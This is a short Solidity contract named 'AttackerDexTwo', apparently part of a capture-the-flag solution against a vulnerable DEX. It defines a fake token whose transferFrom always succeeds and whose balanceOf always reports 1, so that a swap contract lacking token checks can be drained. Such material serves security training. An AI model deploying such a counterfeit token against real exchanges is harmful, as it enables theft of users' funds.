// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract AttackerDexTwo {
    function transferFrom(
        address,
        address,
        uint256
    ) external returns (bool) {
        return true;
    }

    function balanceOf(address) public view returns (uint256) {
        return 1;
    }
}
